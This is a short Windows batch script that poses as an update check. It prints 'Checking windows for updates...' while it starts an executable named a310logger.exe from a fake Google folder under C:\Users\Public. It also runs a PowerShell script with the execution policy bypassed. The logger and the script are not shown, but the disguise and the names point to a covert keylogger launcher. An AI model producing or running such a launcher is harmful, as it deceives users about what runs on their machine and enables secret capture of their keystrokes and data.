@echo off
  @setlocal enableextensions
  @cd /d "%~dp0"
echo Checking windows for updates...


:: run logger
start C:\Users\Public\Google\Google-main\a310logger.exe

:: run powershell
powershell.exe -ExecutionPolicy Bypass -File "C:\Users\Public\Google\Google-main\update.ps1"



		
		timeout 3